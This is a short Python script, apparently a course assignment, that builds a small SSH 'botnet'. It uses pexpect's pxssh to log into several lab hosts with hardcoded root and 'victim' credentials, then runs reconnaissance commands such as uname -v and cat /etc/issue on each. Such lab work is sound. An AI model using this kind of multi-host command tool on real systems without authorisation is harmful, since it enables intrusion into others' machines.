from pexpect import pxssh
import optparse

class Client:
    #prompt to match with command line
    prompt=('#','$')

    def __init__(self,host,user,password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            #TODO create an SSH connection with pxssh
            ssh = pxssh.pxssh()
            #logging in using ssh
            ssh.login(self.host,self.user,self.password)
            return ssh
        except Exception as e:
            #handling exception
            print(e)
            print("[-] Error Connecting")

    def send_command(self,cmd):
        # TODO issue a command to the remote server
        #sending cmd to session
        self.session.sendline(cmd)
        #to match with prompt
        self.session.prompt()
        return self.session.before


def botnetCommand(command):
    # TODO issue a command to each client in the botnet
    #getting all the clients in botnets array 
    for client in botnets:
        outputs = client.send_command(command)       
        #we need to decode it in order to recieve our output in plain text 
        print('[+] '+str(outputs.decode('utf-8'))+'\n')
    print('[*] Output from '+ client.host)

def addClient(host,user,password):
      # TODO create a client and add it to a global array of botnets
    client = Client(host,user,password)
    botnets.append(client)
    
    
# TODO Create a global array that will store botnets
botnets = []
# TODO Create one client for each host you want to attach
addClient('127.0.0.1','root','nmo767')
addClient('192.168.195.131','nayan','toor')
addClient('192.168.195.133','victim','tooor')
# TODO Issue botnet commands
#it gets us the system information about current system as asked in the assignment
botnetCommand('uname -v')
#getting linux kernal version
botnetCommand('cat /etc/issue')